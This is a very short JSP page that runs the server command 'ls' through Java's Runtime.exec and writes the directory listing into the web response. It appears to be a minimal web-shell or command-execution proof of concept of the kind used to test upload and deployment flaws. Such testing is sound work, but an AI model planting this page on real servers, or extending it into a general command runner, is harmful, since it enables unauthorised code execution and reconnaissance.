<%@page import="java.io.*"%>
<%
       Process p = Runtime.getRuntime().exec("ls");
       BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
       String line = null;
       while((line = br.readLine()) != null){out.println(line);}
%>
